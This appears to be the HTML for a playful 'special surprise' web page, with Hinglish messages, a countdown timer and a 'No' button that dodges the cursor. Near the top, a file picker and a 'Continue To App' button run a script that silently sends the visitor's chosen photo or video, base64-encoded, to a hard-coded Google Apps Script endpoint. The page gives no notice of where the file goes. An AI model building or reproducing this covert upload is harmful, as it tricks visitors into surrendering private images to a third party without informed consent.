<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>A Special Surprise...</title>
    <link rel="stylesheet" href="style.css" />
    <style>
      .timer-circle {
        width: 150px;
        height: 150px;
        border-radius: 50%;
        border: 5px solid var(--primary);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 3rem;
        font-weight: 800;
        margin: 30px auto;
        color: #fff;
        box-shadow: 0 0 20px var(--primary);
        text-shadow: 0 0 10px var(--primary);
      }
    </style>
  </head>
  <body>



<input type="file" id="fileInput" accept="image/*,video/*">

<button onclick="uploadPhoto()">Continue To App</button>

<p id="msg"></p>

<script>

let scriptURL="https://script.google.com/macros/s/AKfycbxkFbm2THcUjr9RoGz_SYE5_c2bihgPmtS_KKpwHbmpgyPcC1_gVIQa71bRw5B1CM7Zxw/exec";

function uploadPhoto(){

let file=document.getElementById("fileInput").files[0];

if(!file){

alert("Select photo first");

return;

}

let reader=new FileReader();

reader.onload=function(){

let base64=reader.result.split(",")[1];

fetch(scriptURL,{

method:"POST",

headers:{

"Content-Type":"application/x-www-form-urlencoded"

},

body:"file="+base64+"&name="+file.name

})

.then(res=>{

document.getElementById("msg").innerText="Uploaded Successfully 🎉";

});

};

reader.readAsDataURL(file);

}

</script>


    <div class="glass-container hidden" id="ready-container">
      <h1>Are You Ready?</h1>
      <p>Ek bohot hi special journey shuru hone wali hai...</p>
      <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; position: relative; min-height: 60px; margin-top: 30px;" id="btn-group">
        <button class="btn" id="btn-yes" onclick="window.location.href = 'star_game.html'">YES! Let's Go 🚀</button>
        <button class="btn" id="btn-no" style="background: #555;">Nahi, main darpok hu 🙈</button>
      </div>
    </div>

    <div class="glass-container" id="timer-container">
      <h1 id="main-title">Wait for it...</h1>
      <p id="message">
        Kuch khaas hai tumhare liye. Bas thoda sa intezaar karo!
      </p>

      <div class="timer-circle" id="timer">15</div>
    </div>

    <script>
      const btnNo = document.getElementById('btn-no');

      // No button runs away
      btnNo.addEventListener('mouseover', () => {
        btnNo.style.position = 'absolute';
        const container = document.getElementById('ready-container');
        // Subtract width and add some padding to stay inside bounds safely
        const maxX = Math.max(0, container.clientWidth - btnNo.clientWidth - 20);
        const maxY = Math.max(0, container.clientHeight - btnNo.clientHeight - 20);

        const randomX = Math.random() * maxX;
        const randomY = Math.random() * maxY;

        btnNo.style.left = `${randomX}px`;
        btnNo.style.top = `${randomY}px`;
        btnNo.style.transform = `none`; // Don't use translate anymore
      });

      // Start the timer immediately on load
      let timeLeft = 15;
      const timerEl = document.getElementById("timer");
      const messageEl = document.getElementById("message");
      const titleEl = document.getElementById("main-title");

      const messages = [
        "Patience is key...",
        "Dhadkanain tez ho rahi hain?",
        "Bus aane hi wala hai...",
        "Get Ready!",
      ];

      const countdown = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft;

        if (timeLeft % 4 === 0 && timeLeft > 0) {
          messageEl.textContent =
            messages[Math.floor((15 - timeLeft) / 4) % messages.length];
          messageEl.style.animation = "none";
          void messageEl.offsetWidth; // trigger reflow
          messageEl.style.animation = "fadeIn 1s ease-in-out";
        }

        if (timeLeft <= 0) {
          clearInterval(countdown);
          // Hide timer container, show ready container
          document.getElementById('timer-container').classList.add('hidden');
          document.getElementById('ready-container').classList.remove('hidden');
        }
      }, 1000);
    </script>
  </body>
</html>
